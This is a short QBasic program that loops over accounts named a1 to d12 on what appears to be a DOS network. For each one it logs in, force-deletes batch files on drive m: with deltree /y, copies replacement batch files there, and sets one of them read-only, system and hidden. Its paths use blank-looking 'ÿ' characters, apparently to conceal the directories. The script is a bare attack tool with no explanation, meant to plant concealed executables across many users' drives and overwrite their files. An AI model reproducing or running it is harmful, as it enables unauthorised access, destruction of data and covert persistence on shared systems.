CLS
FOR i = 97 TO 100
 FOR j = 1 TO 12
  a$ = CHR$(i)
  b$ = STR$(j)
  a$ = a$ + b$
  a$ = "c:\ÿmailall\ÿÿÿÿ\login " + a$
  SHELL a$
  SHELL "c:\ÿmailall\ÿÿÿÿ\deltree/y m:\mail.bat"
  SHELL "c:\ÿmailall\ÿÿÿÿ\deltree/y m:\ÿÿÿÿÿ.bat"
  SHELL "copy c:\ÿmailall\mail.bat m:\"
  SHELL "copy c:\ÿmailall\ÿÿÿÿÿ.bat m:\"
  SHELL "c:\ÿmailall\ÿÿÿÿ\attrib m:\ÿÿÿÿÿ.bat +r +s +h"
 NEXT j
NEXT i
SYSTEM

